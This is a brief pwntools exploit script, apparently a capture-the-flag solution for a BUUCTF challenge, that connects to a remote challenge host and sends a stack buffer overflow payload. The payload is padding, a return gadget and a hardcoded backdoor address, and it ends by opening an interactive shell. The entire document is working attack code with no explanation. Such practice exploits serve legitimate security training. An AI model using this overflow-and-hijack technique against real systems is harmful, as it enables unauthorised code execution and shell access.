from pwn import *

#p = process('./pwn1')
context.log_level = 'debug'
p = remote('node3.buuoj.cn', 29794)

backdoor = 0x401186
ret = 0x401016

payload = b'a' * ( 0xf + 8 ) + p64(ret) + p64(backdoor)

#p.recvuntil('input')
p.sendline(payload)

p.interactive()
